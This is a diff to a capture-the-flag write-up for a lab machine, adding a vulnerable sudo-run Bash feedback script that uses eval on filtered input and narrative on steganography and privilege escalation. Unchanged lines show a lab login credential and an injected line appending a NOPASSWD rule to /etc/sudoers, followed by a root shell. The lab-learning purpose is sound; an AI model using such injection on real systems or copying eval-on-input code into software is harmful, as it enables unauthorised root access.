@@ -241,7 +241,8 @@ steghide: the file format of the file "oneforall.jpg" is not supported.
 
 <br>
 
-> The magic bytes inidcate that the file is a PNG, not a JPG... it's labeled as a .jpg so let's change the magic bytes to match the jpg extension FF D8 FF E0 00 10 4A 46 49 46 00 01.
+> The magic bytes inidcate that the file is a PNG, not a JPG... it's labeled as a .jpg so let's change the magic bytes to match the jpg extension 
+```FF D8 FF E0 00 10 4A 46 49 46 00 01```.
 
 <br>
 
@@ -283,6 +284,7 @@ deku:One?NoNoNoNoNo1/A
 > I was able to use the credentials to 'su' to deku, but I wanted a more stable platform, so I tried the creds with SSH. Sure enough we have direct access to deku on the machine via SSH!
 
 ### Script
+---
 
 <br>
 
@@ -307,7 +309,48 @@ User deku may run the following commands on myheroacademia:
 ```
 <br>
 
-> It seem's I can run a script as sudo. Upon investigating the script and trying foolishly to read the /root/root.txt for a quick win. I noticed that the script is checking for many special characters, so many options are off the table here. I figured I could add myself as a user with a root shell, but why not just give myself keys to the castle and add to the sudoers file...
+```
+#!/bin/bash
+
+echo "Hello, Welcome to the Report Form       "
+echo "This is a way to report various problems"
+echo "    Developed by                        "
+echo "        The Technical Department of U.A."
+
+echo "Enter your feedback:"
+read feedback
+
+
+if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
+    echo "It is This:"
+    eval "echo $feedback"
+
+    echo "$feedback" >> /var/log/feedback.txt
+    echo "Feedback successfully saved."
+else
+    echo "Invalid input. Please provide a valid input." 
+fi
+```
+
+<br>
+
+```
+Hello, Welcome to the Report Form       
+This is a way to report various problems
+    Developed by                        
+        The Technical Department of U.A.
+Enter your feedback:
+```
+
+<br>
+
+> It seem's I can run a script as sudo. Upon investigating the script and trying foolishly to read the /root/root.txt for a quick win. I wondered if I could just write to any file, I noticed that the script is checking for many special characters, so, many options were off the table here. 
+
+<br>
+
+> I figured I could add myself as a user with a root shell, but why not just give myself keys to the castle and add to the sudoers file...
+
+<br>
 
 ## Privilege Escalation
 
@@ -327,6 +370,7 @@ deku ALL=NOPASSWD: ALL >> /etc/sudoers
 deku@myheroacademia:~$ sudo su
 root@myheroacademia:/home/deku# 
 ```
+<br>
 
 > We have access to the root account :D
 
@@ -341,9 +385,18 @@ cat /root/root.txt | wc -c
 
 > Wut?? This is not the usual size of a flag...
 
+<br>
+
 ```
 cat /root/root.txt
 ```
+
+<br>
+
+<p align="center" width="100%">
+    <img width="33%" src="">
+</p>
+
 
 > We are now the No.1 Hero!!
 
